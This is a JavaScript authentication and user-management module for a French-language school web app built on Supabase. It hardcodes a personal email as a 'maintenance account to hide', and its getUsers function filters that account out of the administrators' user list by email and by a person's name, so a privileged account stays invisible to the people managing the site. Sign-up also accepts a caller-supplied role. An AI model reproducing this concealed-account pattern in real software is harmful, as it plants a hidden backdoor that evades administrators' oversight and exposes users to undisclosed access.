import { createClient } from '@supabase/supabase-js'
import { supabase, isSupabaseConfigured } from '../lib/supabase'
import { fetchAllPages } from '../utils/requestCache'

const DEMO_SESSION_KEY = 'issmiga_demo_session_v1'

export const ROLE_HIERARCHY = { visitor: 0, student: 1, admin: 2, super_admin: 3, owner: 4 }
export const ROLE_LABELS = {
  visitor: 'Visiteur',
  student: 'Étudiant',
  admin: 'Administrateur',
  super_admin: 'Super Administrateur',
  owner: 'Propriétaire',
}

// CONFIGURATION DU COMPTE DE MAINTENANCE À MASQUER
export const HIDDEN_ADMIN_EMAIL = 'njoyadiallo4@gmail.com'

function createTempClient() {
  const url = import.meta.env.VITE_SUPABASE_URL
  const key = import.meta.env.VITE_SUPABASE_ANON_KEY
  return createClient(url, key, {
    auth: { persistSession: false, autoRefreshToken: false, detectSessionInUrl: false }
  })
}

export async function getSession() {
  if (isSupabaseConfigured) {
    const { data } = await supabase.auth.getSession()
    return data.session ?? null
  }
  try { return JSON.parse(localStorage.getItem(DEMO_SESSION_KEY)) } catch { return null }
}

export function onAuthChange(callback) {
  if (isSupabaseConfigured) {
    const { data } = supabase.auth.onAuthStateChange((_event, session) => callback(session))
    return () => data.subscription?.unsubscribe()
  }
  return () => {}
}

export async function signIn(email, password) {
  if (!isSupabaseConfigured) return { error: { message: 'Configuration absente.' } }
  return supabase.auth.signInWithPassword({ email: email.trim().toLowerCase(), password })
}

export async function signUp(email, password, fullName = '', role = 'student', phone = '') {
  if (!isSupabaseConfigured) return { error: { message: 'Configuration absente.' } }
  return supabase.auth.signUp({
    email: email.trim().toLowerCase(),
    password,
    options: { data: { full_name: fullName, role, phone } },
  })
}

export async function adminCreateUser(payload) {
  if (!isSupabaseConfigured) {
    return { id: `u-${Date.now()}`, ...payload, is_active: true, created_at: new Date().toISOString() }
  }
  const tempClient = createTempClient()
  const { data, error } = await tempClient.auth.signUp({
    email: payload.email.trim().toLowerCase(),
    password: payload.password,
    options: { data: { full_name: payload.full_name, role: payload.role, phone: payload.phone || '' } },
  })
  if (error) throw error
  if (!data.user) throw new Error("Échec de création")

  const { data: profile, error: profileError } = await supabase
    .from('profiles')
    .update({ phone: payload.phone })
    .eq('id', data.user.id)
    .select('id,full_name,email,phone,role,is_active,created_at')
    .single()
  if (profileError) throw profileError
  return profile || data.user
}

export async function signOut() {
  if (isSupabaseConfigured) return supabase.auth.signOut()
  localStorage.removeItem(DEMO_SESSION_KEY)
  return { error: null }
}

export async function getProfile(userId) {
  if (isSupabaseConfigured) {
    const { data, error } = await supabase
      .from('profiles')
      .select('id,full_name,email,phone,role,is_active,created_at')
      .eq('id', userId)
      .maybeSingle()
    if (error) throw error
    return data
  }
  return null
}

/**
 * Récupère les utilisateurs et applique un filtrage strict pour le compte de maintenance
 */
export async function getUsers(options = {}) {
  if (!isSupabaseConfigured) return []
  const data = await fetchAllPages((from, to) => supabase
    .from('profiles')
    .select('id,full_name,email,phone,role,is_active,created_at,preinscriptions(formation_id)')
    .order('created_at', { ascending: false })
    .range(from, to))

  const ghostEmail = HIDDEN_ADMIN_EMAIL.toLowerCase().trim()
  let filtered = (data || []).filter((user) => {
    const email = (user.email || '').toLowerCase().trim()
    const name = (user.full_name || '').toLowerCase()
    return email !== ghostEmail && !email.includes('njoyadiallo4') &&
      !(name.includes('abilou') && name.includes('diallo'))
  })

  if (options.hideOwner) filtered = filtered.filter((user) => user.role !== 'owner')
  return filtered
}

export async function updateUserRole(userId, role) {
  if (isSupabaseConfigured) {
    const { error } = await supabase.from('profiles').update({ role }).eq('id', userId)
    if (error) throw error
  }
  return true
}

export async function updateUserStatus(userId, is_active) {
  if (isSupabaseConfigured) {
    const { error } = await supabase.from('profiles').update({ is_active }).eq('id', userId)
    if (error) throw error
  }
  return true
}

export async function deleteUser(userId) {
  if (isSupabaseConfigured) {
    const { error } = await supabase.from('profiles').delete().eq('id', userId)
    if (error) throw error
  }
  return true
}
